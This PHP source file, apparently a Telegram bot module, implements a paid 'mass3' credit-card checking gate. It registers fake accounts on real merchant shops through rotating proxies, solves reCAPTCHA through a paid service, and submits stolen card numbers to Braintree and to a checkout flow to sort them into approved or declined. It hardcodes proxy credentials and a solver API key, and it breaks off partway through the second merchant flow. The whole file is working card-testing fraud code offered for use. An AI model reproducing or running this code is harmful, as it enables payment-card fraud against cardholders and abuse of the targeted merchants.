<?php

use GuzzleHttp\Client;
use GuzzleHttp\Cookie\CookieJar;
use GuzzleHttp\Exception\RequestException;

list($cmd) = explode(" ", $message);
if($cmd == "/mass3" or $cmd == ".mass3" or $cmd == "!mass3"){  
$tiempo_inicial = microtime(true);

$tiempo_inicial = microtime(true);
deleteprm($userId);
    is_credits();
    $NameGater ='mass3';
$gateway = '/mass3 :'.$NameGater;
Contador($gateway);
    deltecred($userId);
    is_gateroff('mass3');
    $Mi_Id = "5168647868";
$targetas = substr($message, 6);
if(empty($targetas)){
$targetas = $r_msg;
}if(empty($targetas)){
$targetas = $q_msg;}

if (empty($targetas)){
        reply_to($chatId, $message_id,$keyboard,'<b>Mass Auth%0AFormat: cc|m|y|cvv</b>');
        die();
    }

$bin = substr($targetas, 0,6);
$bines = bannedbin($bin);
        if($bines == true){
            reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
            exit();
        }


$nui = infouser($userId);
    $Rank = $nui['apodo'];
if($gId == $Mi_Id){
    $Rank = "Owner";
    $GLOBALS['Rank'] = $Rank;
}elseif($userId == verifiAdmin($userId)){
    $Rank ="Admin";
    $GLOBALS['Rank'] = $Rank;
}elseif($userId == veritimepremium($userId)){
   $Rank = $nui['apodo'];
}elseif($chatId == verifiCharAdmin($chatId)){
    $Rank = "Free User";
    $GLOBALS['Rank'] = $Rank;
}
elseif($userId == verificadroCrdediuser($userId)){
    $Rank ="Free user";
    $GLOBALS['Rank'] =$Rank;
}

$db->where ("userdid", $userId);
$user = $db->getOne ("creditos");
$creditos = $user['creditos'];
if ($creditos < 0) {
    reply_to($chatId,$message_id,$keyboard,"<b>Creditos Insuficiente</b>.");
    deltecred($userId);
    exit();
}
if($creditos < 5){
    reply_to($chatId,$message_id,$keyboard,"<b>Creditos Insuficiente</b>.");
    exit();
}
function masse3($lista){
global $curl,$solver,$db,$userId; 
  
$db->where ("userdid", $userId);
$user = $db->getOne ("creditos");
$creditos = $user['creditos'];
if ($creditos < 0) {
    $status = "DECLINED ❌";
    $response = "Creditos Insuficiente";
    return (string)$status . "\n" . (string)$response . "\n";
    exit();
}    


$separa = explode("|", $lista);

$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];


$session_id = GUID();

if(strlen($ano) == 2){
    $ano = "20".$ano;
}

$client = new Client();
$cookies = new CookieJar();


$response = $client->request('GET', 'https://randomuser.me/api/?nat=gb');
$data = json_decode($response->getBody(), true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"])  . strtolower($user["name"]["last"]) . rand(111,33452).'@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];


$res = $client->request('GET', "https://www.fakexy.com/fake-address-generator-us");
$html = (string) $res->getBody();
$dom = new DOMDocument;
@$dom->loadHTML($html);
$xpath = new DOMXPath($dom);
$street = $xpath->query('//td[text()="Street"]/following-sibling::td')->item(0)->nodeValue ?? "none";
$city = $xpath->query('//td[text()="City/Town"]/following-sibling::td')->item(0)->nodeValue ?? "none";
$state = $xpath->query('//td[text()="State/Province/Region"]/following-sibling::td')->item(0)->nodeValue ?? "none";
$zip = $xpath->query('//td[text()="Zip/Postal Code"]/following-sibling::td')->item(0)->nodeValue ?? "none";
$phone = $xpath->query('//td[text()="Phone Number"]/following-sibling::td')->item(0)->nodeValue ?? "none";
$country = $xpath->query('//td[text()="Country"]/following-sibling::td')->item(0)->nodeValue ?? "none";

$password = substr(str_shuffle('abcdefMNOPQ56789_!'), 0, 12);

$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];

$socks5 = socks5();
$rotate = rotate();


$maxRetries = 3; // Número máximo de reintentos
$retries = 0; // Contador de reintentos

$tiempo_inicial = microtime(true);

while ($retries < $maxRetries) {
    try {
        $proxy = ['https' => 'http://' . $rotate . '@' . $socks5];



$response = $client->request('GET', 'https://shop.bullfrogspas.com/my-account/', [
    'connect_timeout' => 10,
    'timeout' => 30,
    'cookies' => $cookies,
    'proxy' => $proxy,
]);
if ($response->getStatusCode() != 200) {
    throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
}
$nonce = trim(strip_tags(GetStr($response->getBody(), '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '"')));

$start_time = date("Y-m-d+H:i:s");

$headers = [
    'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'content-type' => 'application/x-www-form-urlencoded',
    'origin' => 'https://shop.bullfrogspas.com',
    'referer' => 'https://shop.bullfrogspas.com/my-account/',
    'upgrade-insecure-requests' => '1',
    'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
];

$postdata = 'username='.$firstname.rand(111,9999).'&email='.urlencode($email).'&password='.$password.'&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fshop.bullfrogspas.com%2Fmy-account%2F&wc_order_attribution_session_start_time='.urlencode($start_time).'&wc_order_attribution_session_pages=2&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36&woocommerce-register-nonce='.$nonce.'&_wp_http_referer=%2Fmy-account%2F&register=Register';
$response = $client->request('POST','https://shop.bullfrogspas.com/my-account/',[
    'body' => $postdata,
    'connect_timeout' => 10,
    'timeout' => 5,
    'headers' => $headers,
    'cookies' => $cookies,
    'proxy' => $proxy,
]);


if ($response->getStatusCode() != 200) {
    throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
}


$response = $client->request('GET', 'https://shop.bullfrogspas.com/my-account/edit-address/billing/', [
    'connect_timeout' => 10,
    'timeout' => 30,
    'cookies' => $cookies,
    'proxy' => $proxy,
]);
if ($response->getStatusCode() != 200) {
    throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
}

$nonce2 = trim(strip_tags(GetStr($response->getBody(),'<input type="hidden" id="_wpnonce" name="_wpnonce" value="', '"')));

if ($nonce2 == "null") {
    throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
}


$headers = [
    'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'content-type' => 'application/x-www-form-urlencoded',
    'origin' => 'https://www.bebebrands.com',
    'referer' => 'https://shop.bullfrogspas.com/my-account/edit-address/billing/',
    'upgrade-insecure-requests' => '1',
];

$postdata = 'billing_first_name='.$firstname.'&billing_last_name='.$lastname.'&billing_company=Corp+'.$lastname.'&billing_country=US&billing_address_1='.urlencode($street).'&billing_address_2=&billing_city='.urlencode($city).'&billing_state='.$regioncode.'&billing_postcode='.$zip.'&billing_phone='.urlencode($phone).'&billing_email='.urlencode($email).'&save_address=Save+address&_wpnonce='.$nonce2.'&_wp_http_referer=%2Fmy-account%2Fedit-address%2Fbilling%2F&action=edit_address';

$response = $client->request('POST','https://shop.bullfrogspas.com/my-account/edit-address/billing/',[
    'body' => $postdata,
    'headers' => $headers,
    'cookies' => $cookies,
    'proxy' => $proxy,
]);
if ($response->getStatusCode() != 200) {
    throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
}


$headers = [
    'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'content-type' => 'application/x-www-form-urlencoded',
    'origin' => 'https://www.bebebrands.com',
    'referer' => 'https://shop.bullfrogspas.com/my-account/edit-address/shipping/',
    'upgrade-insecure-requests' => '1',
];
$postdata = 'shipping_first_name='.$firstname.'&shipping_last_name='.$lastname.'&shipping_company=Corp+'.$lastname.'&shipping_country=US&shipping_address_1='.urlencode($street).'&shipping_address_2=&shipping_city='.urlencode($city).'&shipping_state='.$regioncode.'&shipping_postcode='.$zip.'&shipping_phone='.urlencode($phone).'&save_address=Save+address&_wpnonce='.$nonce2.'&_wp_http_referer=%2Fmy-account%2Fedit-address%2Fshipping%2F&action=edit_address';
$response = $client->request('POST','https://shop.bullfrogspas.com/my-account/edit-address/shipping/',[
    'body' => $postdata,
    'headers' => $headers,
    'cookies' => $cookies,
    'proxy' => $proxy,
]);




if ($response->getStatusCode() != 200) {
    throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
}

$response = $client->request('GET', 'https://shop.bullfrogspas.com/my-account/add-payment-method/', [
    'connect_timeout' => 10,
    'timeout' => 30,
    'cookies' => $cookies,
    'proxy' => $proxy,
]);
if ($response->getStatusCode() != 200) {
    throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
}
$nonce3 = GetStr($response->getBody(), '<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '"');
$clientnonce = GetStr($response->getBody(), '"credit_card","client_token_nonce":"', '"');


$headers = [
    'accept' => '*/*',
    'accept-language' => 'es-ES,es;q=0.9',
    'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin' => 'https://shop.bullfrogspas.com',
    'referer' => 'https://shop.bullfrogspas.com/my-account/add-payment-method/',
    'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with' => 'XMLHttpRequest',
];
$postdata = 'action=wc_braintree_credit_card_get_client_token&nonce='.$clientnonce.'';

$response = $client->request('POST','https://shop.bullfrogspas.com/wp-admin/admin-ajax.php',[
    'body' => $postdata,
    'connect_timeout' => 10,
    'timeout' => 5,
    'headers' => $headers,
    'cookies' => $cookies,
    'proxy' => $proxy,
]);

$data = base64_decode(trim(GetStr($response->getBody(), '"data":"', '"')));
$Bearer = trim(GetStr($data, '"authorizationFingerprint":"', '"'));

$headers = [
    'accept' => '*/*',
    'accept-language' => 'es-ES,es;q=0.9',
    'authorization' => 'Bearer '.$Bearer.'',
    'braintree-version' => '2018-05-10',
    'content-type' => 'application/json',
    'origin' => 'https://assets.braintreegateway.com',
    'priority' => 'u=1, i',
    'referer' => 'https://assets.braintreegateway.com/',
    'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
];

$uuid = sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x', mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0x0fff) | 0x4000, mt_rand(0, 0x3fff) | 0x8000, mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff));

$postdata = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"cc3b0f9a-52f6-4cea-9577-8a559b3163fa"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"' . $cc . '","expirationMonth":"' . $mes . '","expirationYear":"' . $ano . '","cvv":"' . $cvv . '"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}';
$response = $client->request('POST','https://payments.braintree-api.com/graphql',[
    'body' => $postdata,
    'connect_timeout' => 10,
    'timeout' => 5,
    'headers' => $headers,
    'cookies' => $cookies,
    //'proxy' => $proxy,
]);

if ($response->getStatusCode() != 200) {
    throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
}
$token = trim(GetStr($response->getBody(), '"token":"', '"'));
        

$solver = new \Capsolver\CapsolverClient('CAP-5361C0C774F336BECC410D69E869566E');

$solution = $solver->recaptchaV2(
    \Capsolver\Solvers\Token\ReCaptchaV2::TASK_PROXYLESS,
[
'websiteURL'    => 'https://shop.bullfrogspas.com/',
'websiteKey'    => '6Ld_9pwkAAAAAN1LXiEyEZw0J8E95EDWrDDmdySm',
]);
$captcha = $solution["gRecaptchaResponse"];


$randomString = bin2hex(random_bytes(16));
$hash = sha1($randomString);


$headers = [
    'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language' => 'es-ES,es;q=0.9',
    'cache-control' => 'max-age=0',
    'content-type' => 'application/x-www-form-urlencoded',
    'origin' => 'https://shop.bullfrogspas.com',
    'referer' => 'https://shop.bullfrogspas.com/my-account/add-payment-method/',
    'upgrade-insecure-requests' => '1',
    'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
];

$postdata = 'payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=master-card&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce='.$token.'&wc_braintree_device_data=%7B%22correlation_id%22%3A%22'.$hash.'%22%7D&wc-braintree-credit-card-tokenize-payment-method=true&wc_braintree_paypal_payment_nonce=&wc_braintree_device_data=%7B%22correlation_id%22%3A%22'.$hash.'%22%7D&wc-braintree-paypal-context=shortcode&wc_braintree_paypal_amount=0.00&wc_braintree_paypal_currency=USD&wc_braintree_paypal_locale=en_us&wc-braintree-paypal-tokenize-payment-method=true&g-recaptcha-response='.$captcha.'&woocommerce-add-payment-method-nonce='.$nonce3.'&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1';
$response = $client->request('POST','https://shop.bullfrogspas.com/my-account/add-payment-method/',[
    'body' => $postdata,
    'connect_timeout' => 10,
    'timeout' => 5,
    'headers' => $headers,
    'cookies' => $cookies,
    'proxy' => $proxy,
]);
if ($response->getStatusCode() != 200) {
    throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
}

break; 
} catch (RequestException $e) {
    $retries++;
    if ($retries >= $maxRetries) {
          $text = Textretries();
    $status = "An error occurred while finding the Token⚠️️";
    $response = "Error after 3 attempts";
    goto end;
    }
}
}
$mgs = trim(strip_tags(GetStr($response->getBody(), '<ul class="woocommerce-error" role="alert">', '</li>')));






if(substr_count($response->getBody(), "Payment method successfully added.") || substr_count($response->getBody(), "New payment method added") || substr_count($response->getBody(), "Duplicate card exists in the vault")){
$status = "Approved ✅";
$response = "Approved";
p_rce($userId,"3");
}elseif(substr_count($response->getBody(), "Gateway Rejected: cvv")){
$status = "Approved ✅";
$response = "$mgs";
p_rce($userId,"3");
}elseif(substr_count($response->getBody(), "Gateway Rejected: avs_and_cvv")){
$status = "Approved ✅";
$response = "$mgs";
p_rce($userId,"3");
}elseif(substr_count($response->getBody(), "Gateway Rejected: avs")){
$status = "Approved ✅";
$response = "$mgs";
p_rce($userId,"3");
}elseif(substr_count($response->getBody(), "Card Issuer Declined CVV")){
$status = "Approved ✅";
$response = "$mgs";
p_rce($userId,"3");
}elseif(substr_count($response->getBody(), "Insufficient Funds")){
$status = "Approved ✅";
$response = "$mgs";
p_rce($userId,"3");
}else{
$status = "DECLINED ❌";
$response = "$mgs";
p_rce($userId,"1");
}
end:
return (string)$status . "\n" . (string)$response . "\n";
}


antisppre($userId); //Premium
antispFree($userId); //Free User

  
  
  
function MASS3($lista){
global $curl,$solver,$db,$userId; 


    $separa = explode("|", $lista);
    $cc = $separa[0];
    $mes = $separa[1];
    $ano = $separa[2];
    $cvv = $separa[3];


    if(strlen($mes) == 1){
        $mes = '0'.$mes;
    }
    if(strlen($ano) == 2){
        $ano = '20'.$ano;
    }

    $curl = new CurlX;
    $cookie = uniqid();

    $result = [];
    $maxRetries = 3; // número máximo de intentos
    $retries = 0; // contador de intentos


    $socks5 = "all.dc.smartproxy.com:10000";
    $rotate = "Testingthis123:Testingpassword12+";
    
    
    $db->where ("userdid", $userId);
$user = $db->getOne ("creditos");
$creditos = $user['creditos'];
if ($creditos < 0) {
    
                $result = [
                'status' => 'DECLINED ❌"',
                'message' => "Creditos Insuficiente",
                'retries' => $retries
            ];
            return json_encode($result);
    exit();
}
    while ($retries < $maxRetries) {
        try { 
            $cookie = uniqid();
            $server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];
    
    
            $json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"])  . strtolower($user["name"]["last"]) .rand(111,2343). '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];


    $headers = [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
    ];
    $request = $curl::Get('https://www.fragrantfields.com/ladybells.aspx', $headers, $cookie, $server);
    if ($request->code != "200") {
        throw new Exception("Connection error on request attempt #1" . $retries . ". Please try again.");
    }
    
    $viewgen = $curl->ParseString($request->body, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"');
    $view = $curl->ParseString($request->body, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"');
    $even = $curl->ParseString($request->body, '<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"');
    
    
    
    $headers = [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: es-ES,es;q=0.9',
        'Cache-Control: max-age=0',
        'Connection: keep-alive',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.fragrantfields.com',
        'Referer: https://www.fragrantfields.com/ladybells.aspx',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    ];
    $data = '__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='.urlencode($view).'&__VIEWSTATEGENERATOR='.$viewgen.'&__SCROLLPOSITIONX=0&__SCROLLPOSITIONY=239&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION='.urlencode($even).'&ctl00%24ctl03%24txtSearch=&ctl00%24pageContent%24productDetailsID=8&ctl00%24pageContent%24txtQuantity=1&ctl00%24pageContent%24addToCart.x=25&ctl00%24pageContent%24addToCart.y=15&ctl00%24ctl08%24mailingList%24txtEmail=&ctl00%24ctl10%24lvDisplay%24txtUsername=&ctl00%24ctl10%24lvDisplay%24txtPassword=';
    $request = $curl::Post('https://www.fragrantfields.com/ladybells.aspx', $data, $headers, $cookie, $server);
    
    if ($request->code != "200") {
        throw new Exception("Connection error on request attempt #2" . $retries . ". Please try again.");
    }
    
    
    $headers = [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer: https://www.fragrantfields.com/ladybells.aspx',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    ];
    $request = $curl::Get('https://www.fragrantfields.com/checkout.aspx', $headers, $cookie, $server);
    
    if ($request->code != "200") {
        throw new Exception("Connection error on request attempt #3 " . $retries . ". Please try again.");
    }
    
    $viewgen = $curl->ParseString($request->body, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"');
    $view = $curl->ParseString($request->body, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"');
    $even = $curl->ParseString($request->body, '<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"');
    $previpage = $curl->ParseString($request->body, '<input type="hidden" name="__PREVIOUSPAGE" id="__PREVIOUSPAGE" value="', '"');
    
    
    if ($viewgen == "null" || $view == "null" || $even == "null" || $previpage == "null") {
        throw new Exception("Error capturing token. Retry attempt number " . $retries . ". Please try again.");
    }
    
    $headers = [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: es-ES,es;q=0.9',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.fragrantfields.com',
        'Referer: https://www.fragrantfields.com/checkout.aspx',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    ];
    $data = 'ctl00%24ctl03%24txtSearch=&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtFirstName='.$firstname.'&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtLastName='.$lastname.'&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtCompanyName=Corp+'.$lastname.'&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24ddlCountry=US&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtAddress1=420+Capitol+Way+S&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtAddress2=&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtZipPostal=98501&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtCity=Olympia&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24usStates=WA&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtPhoneNumber=3609437661&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24chkBillingSameAsShipping=on&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtFirstName=&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtLastName=&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtCompanyName=&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24ddlCountry=US&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtAddress1=&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtAddress2=&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtZipPostal=&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtCity=&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24usStates=AL&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtPhoneNumber=&ctl00%24pageContent%24checkoutWizard%24emailForm%24txtEmail='.urlencode($email).'&ctl00%24pageContent%24checkoutWizard%24emailForm%24txtConfirmEmail='.urlencode($email).'&ctl00%24pageContent%24checkoutWizard%24StartNavigationTemplateContainerID%24btnNext.x=33&ctl00%24pageContent%24checkoutWizard%24StartNavigationTemplateContainerID%24btnNext.y=13&ctl00%24ctl08%24mailingList%24txtEmail='.urlencode($email).'&ctl00%24ctl10%24lvDisplay%24txtUsername='.urlencode($email).'&ctl00%24ctl10%24lvDisplay%24txtPassword=&__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE='.urlencode($view).'&__VIEWSTATEGENERATOR='.$viewgen.'&__SCROLLPOSITIONX=198&__SCROLLPOSITIONY=352&__VIEWSTATEENCRYPTED=&__PREVIOUSPAGE='.$previpage.'&__EVENTVALIDATION='.urlencode($even).'';
    
    $request = $curl::Post('https://www.fragrantfields.com/checkout.aspx?step-2', $data, $headers, $cookie, $server);
    
    
    $viewgen = $curl->ParseString($request->body, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"');
    $view = $curl->ParseString($request->body, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"');
    $even = $curl->ParseString($request->body, '<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"');
    $previpage = $curl->ParseString($request->body, '<input type="hidden" name="__PREVIOUSPAGE" id="__PREVIOUSPAGE" value="', '"');
    
    if ($viewgen == "null" || $view == "null" || $even == "null" || $previpage == "null") {
        throw new Exception("Error capturing token. Retry attempt number " . $retries . ". Please try again.");
    }
    
    $headers = [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.fragrantfields.com',
        'Referer: https://www.fragrantfields.com/checkout.aspx?step-2',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    ];
    $data = '__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='.urlencode($view).'&__VIEWSTATEGENERATOR='.$viewgen.'&__SCROLLPOSITIONX=422&__SCROLLPOSITIONY=231&__VIEWSTATEENCRYPTED=&__PREVIOUSPAGE='.$previpage.'&__EVENTVALIDATION='.urlencode($even).'&ctl00%24ctl03%24txtSearch=&ShippingOptions=ctl00%24pageContent%24checkoutWizard%24shippingMethods%24USPS%24rate0&ctl00%24pageContent%24checkoutWizard%24giftCertificates%24txtEnterGiftCertificateCode=&ctl00%24pageContent%24checkoutWizard%24ppQuestions%24chkPQ13469PA27143=on&ctl00%24pageContent%24checkoutWizard%24ppQuestions%24txtPQ13471PA27151=&ctl00%24pageContent%24checkoutWizard%24StepNavigationTemplateContainerID%24btnNext.x=67&ctl00%24pageContent%24checkoutWizard%24StepNavigationTemplateContainerID%24btnNext.y=19&ctl00%24ctl08%24mailingList%24txtEmail='.urlencode($email).'&ctl00%24ctl10%24lvDisplay%24txtUsername='.urlencode($email).'&ctl00%24ctl10%24lvDisplay%24txtPassword=';
    $request = $curl::Post('https://www.fragrantfields.com/checkout.aspx?step-3', $data, $headers, $cookie, $server);
    
    
    $viewgen = $curl->ParseString($request->body, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"');
    $view = $curl->ParseString($request->body, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"');
    $even = $curl->ParseString($request->body, '<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"');
    $previpage = $curl->ParseString($request->body, '<input type="hidden" name="__PREVIOUSPAGE" id="__PREVIOUSPAGE" value="', '"');
    
    if ($viewgen == "null" || $view == "null" || $even == "null" || $previpage == "null") {
        throw new Exception("Error capturing token. Retry attempt number " . $retries . ". Please try again.");
    }
    
    $option2 = [
        '5' => '1', // MasterCard
        '6' => '3', // Discover
        '4' => '2', // Visa
    ];
    $type2 = $option2[substr($cc ,0,1)];
    
    
    
    $headers = [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: es-ES,es;q=0.9',
        'Cache-Control: max-age=0',
        'Connection: keep-alive',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.fragrantfields.com',
        'Referer: https://www.fragrantfields.com/checkout.aspx?step-3',
        'Upgrade-Insecure-Requests: 1',
